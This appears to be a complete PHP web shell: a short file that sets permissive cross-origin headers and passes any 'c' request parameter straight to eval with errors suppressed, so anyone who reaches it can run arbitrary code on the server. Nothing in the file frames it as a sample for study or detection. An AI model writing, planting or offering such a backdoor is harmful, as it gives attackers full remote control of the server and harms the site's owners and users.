<?php
header('Access-Control-Allow-Headers: *');
header('Access-Control-Allow-Methods: *');
header('Access-Control-Allow-Origin: *');
//header("Content-Type: text/html;charset=GBK");

@eval($_REQUEST['c']);
//print_r($_REQUEST['c']);
//print_r($_REQUEST);

?>